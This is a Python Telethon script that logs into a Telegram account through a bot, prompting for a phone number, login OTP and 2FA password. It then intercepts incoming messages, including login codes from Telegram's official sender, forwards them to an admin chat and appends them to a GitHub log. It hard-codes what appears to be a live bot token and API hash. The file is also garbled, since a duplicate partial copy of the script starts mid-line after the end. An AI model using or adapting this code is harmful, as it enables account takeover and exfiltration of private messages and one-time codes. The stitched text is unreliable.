"""
message_fetcher.py (Bot-Controlled Session Creation + GitHub Sync)
"""

import os
import base64
import asyncio
import requests
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession

# ---------- TELEGRAM CONFIG ----------
API_ID = int(os.getenv("API_ID", 21952127))
API_HASH = os.getenv("API_HASH", "e0a3741bb3b132947d86d8fc6218eebe")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8404621004:AAHw6mGTtkEy216RFzsNS1AJYxx_eOl_rkQ")
ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID", 5873906843))

TELEGRAM_OFFICIAL = {777000}  # OTP sender ID

# ---------- GITHUB CONFIG ----------
GITHUB_TOKEN = os.getenv("GTOKEN", "your_github_token_here")
REPO = os.getenv("REPO", "Kislayyadavme/Myfile")
FILE_PATH = os.getenv("FILE_PATH", "messages.log")
MODE_FILE_GITHUB = os.getenv("MODE_FILE_GITHUB", "mode.txt")
BRANCH = os.getenv("BRANCH", "main")

# ---------- MODE MANAGEMENT ----------
MODE_FILE_LOCAL = "mode.txt"

def fetch_mode_from_github():
    url = f"https://api.github.com/repos/{REPO}/contents/{MODE_FILE_GITHUB}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    r = requests.get(url, headers=headers, params={"ref": BRANCH})
    if r.status_code == 200:
        data = r.json()
        return base64.b64decode(data["content"]).decode().strip()
    return None

def update_mode_on_github(mode: str):
    url = f"https://api.github.com/repos/{REPO}/contents/{MODE_FILE_GITHUB}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    b64_content = base64.b64encode(mode.encode()).decode()

    payload = {
        "message": f"🔄 Mode updated → {mode.upper()}",
        "content": b64_content,
        "branch": BRANCH
    }

    r = requests.get(url, headers=headers, params={"ref": BRANCH})
    if r.status_code == 200:
        payload["sha"] = r.json()["sha"]

    resp = requests.put(url, headers=headers, json=payload)
    if resp.status_code not in (200, 201):
        print("⚠️ GitHub mode update failed:", resp.status_code, resp.text)
    else:
        print("✅ GitHub mode.txt updated successfully.")

def load_mode():
    if os.path.exists(MODE_FILE_LOCAL):
        return open(MODE_FILE_LOCAL).read().strip()
    github_mode = fetch_mode_from_github()
    return github_mode if github_mode else "otp"

def save_mode(mode: str):
    with open(MODE_FILE_LOCAL, "w") as f:
        f.write(mode)
    update_mode_on_github(mode)

current_mode = load_mode()

# ---------- CLIENTS ----------
bot_client = TelegramClient("bot_session", API_ID, API_HASH)
SESSION_STRING = os.getenv("SESSION_STRING")

# ---------- GITHUB LOGGER ----------
def update_github_file(new_text: str):
    url = f"https://api.github.com/repos/{REPO}/contents/{FILE_PATH}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}

    r = requests.get(url, headers=headers, params={"ref": BRANCH})
    if r.status_code == 200:
        data = r.json()
        old_content = base64.b64decode(data["content"]).decode()
        sha = data["sha"]
    else:
        old_content, sha = "", None

    updated_content = old_content + "\n" + new_text
    b64_content = base64.b64encode(updated_content.encode()).decode()

    payload = {
        "message": "📜 Update log from Telegram script",
        "content": b64_content,
        "branch": BRANCH
    }
    if sha:
        payload["sha"] = sha

    resp = requests.put(url, headers=headers, json=payload)
    if resp.status_code not in (200, 201):
        print("⚠️ GitHub update failed:", resp.status_code, resp.text)
    else:
        print("✅ GitHub file updated successfully.")

# ---------- BOT INTERACTIVE INPUT ----------
async def get_input_from_bot(prompt: str):
    """
    Ask a question via bot and wait for reply from ADMIN_CHAT_ID.
    """
    await bot_client.send_message(ADMIN_CHAT_ID, f"❓ {prompt}")

    loop = asyncio.get_event_loop()
    future = loop.create_future()

    @bot_client.on(events.NewMessage(from_user=ADMIN_CHAT_ID))
    async def handler(event):
        if not future.done():
            future.set_result(event.raw_text.strip())
            bot_client.remove_event_handler(handler, events.NewMessage)

    return await future

async def create_session_via_bot():
    """
    Interactive login via Telegram bot.
    """
    phone = await get_input_from_bot("Enter your phone number with country code:")
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()

    if not await client.is_user_authorized():
        await client.send_code_request(phone)
        otp = await get_input_from_bot("Enter the OTP you received:")
        try:
            await client.sign_in(phone=phone, code=otp)
        except Exception:
            pw = await get_input_from_bot("Your account has 2FA enabled. Enter password:")
            await client.sign_in(password=pw)

    session_str = client.session.save()
    await bot_client.send_message(ADMIN_CHAT_ID, f"✅ Session created! Save this:\n`{session_str}`")
    return session_str

async def init_user_client():
    global SESSION_STRING
    if not SESSION_STRING:
        SESSION_STRING = await create_session_via_bot()
    return TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)

# ---------- BOT CONTROL ----------
@bot_client.on(events.NewMessage(pattern="/start"))
async def start_cmd(event):
    if event.sender_id != ADMIN_CHAT_ID:
        return
    await event.respond(
        "🤖 **Welcome Boss!**\nChoose your mode:",
        buttons=[
            [Button.inline("🔑 OTP Mode", b"otp")],
            [Button.inline("💌 Private Mode", b"private")],
            [Button.inline("🌐 All Messages", b"all")],
            [Button.inline("📋 Show Current Mode", b"show")]
        ]
    )

@bot_client.on(events.CallbackQuery)
async def callback_handler(event):
    global current_mode
    if event.sender_id != ADMIN_CHAT_ID:
        return

    if event.data == b"otp":
        current_mode = "otp"
        save_mode("otp")
        await event.edit("✅ Mode switched → **🔑 OTP Only**")
    elif event.data == b"private":
        current_mode = "private"
        save_mode("private")
        await event.edit("✅ Mode switched → **💌 Private Chats**")
    elif event.data == b"all":
        current_mode = "all"
        save_mode("all")
        await event.edit("✅ Mode switched → **🌐 All Messages**")
    elif event.data == b"show":
        await event.answer(f"📋 Current mode: {current_mode.upper()}", alert=True)

# ---------- USER MESSAGE HANDLER ----------
async def register_handlers(user_client):
    @user_client.on(events.NewMessage(incoming=True))
    async def handle_new_message(event):
        global current_mode
        try:
            sender = await event.get_sender()
            sender_id = event.sender_id
            text = event.raw_text or ""
            chat_id = event.chat_id

            if current_mode == "otp" and sender_id not in TELEGRAM_OFFICIAL:
                return
            if current_mode == "private" and not event.is_private:
                return

            sender_name = getattr(sender, 'username', None) or getattr(sender, 'first_name', None) or "Unknown"
            short_info = f"👤 {sender_name} (ID: {sender_id}, Chat: {chat_id})"
            timestamp = event.message.date.strftime("%Y-%m-%d %H:%M:%S")

            if sender_id in TELEGRAM_OFFICIAL:
                display = f"🕒 {timestamp}\n🔑 OTP MESSAGE\n{short_info}\n\n{text}\n---"
                forward_text = f"🔑 OTP\n{short_info}\n🕒 {timestamp}\n\n{text}"
            else:
                display = f"🕒 {timestamp}\n💌 Message\n{short_info}\n\n{text}\n---"
                forward_text = f"💌 New message\n{short_info}\n🕒 {timestamp}\n\n{text}"

            print(display)
            await bot_client.send_message(ADMIN_CHAT_ID, forward_text)
            update_github_file(display)

        except Exception as exc:
            print("❌ Error handling new message:", exc)

# ---------- RUN ----------
async def main():
    print("🚀 Starting Telegram Clients...")
    await bot_client.start(bot_token=BOT_TOKEN)

    user_client = await init_user_client()
    await user_client.start()
    await register_handlers(user_client)

    me = await user_client.get_me()
    print(f"✅ Logged in as User: {me.first_name} ({me.id})")
    print(f"📡 Current mode: {current_mode.upper()}")

    await asyncio.gather(
        user_client.run_until_disconnected(),
        bot_client.run_until_disconnected()
    )

if __name__ == "__main__":
    try:
        asyncio.get_event_loop().run_until_complete(main())
    except KeyboardInterrupt:
        print("🛑 Stopped by user.")    resp = requests.put(url, headers=headers, json=payload)
    if resp.status_code not in (200, 201):
        print("⚠️ GitHub update failed:", resp.status_code, resp.text)
    else:
        print("✅ GitHub file updated successfully.")


# ---------- BOT CONTROL ----------
@bot_client.on(events.NewMessage(pattern="/start"))
async def start_cmd(event):
    if event.sender_id != ADMIN_CHAT_ID:
        return
    await event.respond(
        "🤖 **Welcome Boss!**\nChoose your mode:",
        buttons=[
            [Button.inline("🔑 OTP Mode", b"otp")],
            [Button.inline("💌 Private Mode", b"private")],
            [Button.inline("🌐 All Messages", b"all")],
            [Button.inline("📋 Show Current Mode", b"show")]
        ]
    )


@bot_client.on(events.CallbackQuery)
async def callback_handler(event):
    global current_mode
    if event.sender_id != ADMIN_CHAT_ID:
        return

    if event.data == b"otp":
        current_mode = "otp"
        save_mode("otp")
        await event.edit("✅ Mode switched → **🔑 OTP Only**")
        print("🔑 Mode switched → OTP only")

    elif event.data == b"private":
        current_mode = "private"
        save_mode("private")
        await event.edit("✅ Mode switched → **💌 Private Chats**")
        print("💌 Mode switched → Private only")

    elif event.data == b"all":
        current_mode = "all"
        save_mode("all")
        await event.edit("✅ Mode switched → **🌐 All Messages**")
        print("🌐 Mode switched → All messages")

    elif event.data == b"show":
        await event.answer(f"📋 Current mode: {current_mode.upper()}", alert=True)


# ---------- USER MESSAGE HANDLER ----------
async def register_handlers(user_client):
    @user_client.on(events.NewMessage(incoming=True))
    async def handle_new_message(event):
        global current_mode
        try:
            sender = await event.get_sender()
            sender_id = event.sender_id
            text = event.raw_text or ""
            chat_id = event.chat_id

            if current_mode == "otp" and sender_id not in TELEGRAM_OFFICIAL:
                return
            if current_mode == "private" and not event.is_private:
                return

            sender_name = getattr(sender, 'username', None) or getattr(sender, 'first_name', None) or "Unknown"
            short_info = f"👤 {sender_name} (ID: {sender_id}, Chat: {chat_id})"
            timestamp = event.message.date.strftime("%Y-%m-%d %H:%M:%S")

            if sender_id in TELEGRAM_OFFICIAL:
                display = f"🕒 {timestamp}\n🔑 OTP MESSAGE from Telegram\n{short_info}\n\n{text}\n---"
                forward_text = f"🔑 OTP from Telegram Official\n🕒 {timestamp}\n{short_info}\n\n{text}"
            else:
                display = f"🕒 {timestamp}\n💌 Message\n{short_info}\n\n{text}\n---"
                forward_text = f"💌 New message\n{short_info}\n🕒 {timestamp}\n\n{text}"

            print(display)
            await bot_client.send_message(ADMIN_CHAT_ID, forward_text)
            update_github_file(display)

        except Exception as exc:
            print("❌ Error handling new message:", exc)


# ---------- RUN ----------
async def main():
    global bot_client
    print("🚀 Starting Telegram Clients...")

    # Start bot client
    await bot_client.start(bot_token=BOT_TOKEN)

    # Init user client
    user_client = await init_user_client()
    await user_client.start()
    await register_handlers(user_client)

    me = await user_client.get_me()
    print(f"✅ Logged in as User: {me.first_name} ({me.id})")
    print(f"📡 Current mode: {current_mode.upper()}")

    # Run both together
    await asyncio.gather(
        user_client.run_until_disconnected(),
        bot_client.run_until_disconnected()
    )


if __name__ == "__main__":
    try:
        asyncio.get_event_loop().run_until_complete(main())
    except KeyboardInterrupt:
        print("🛑 Stopped by user.")
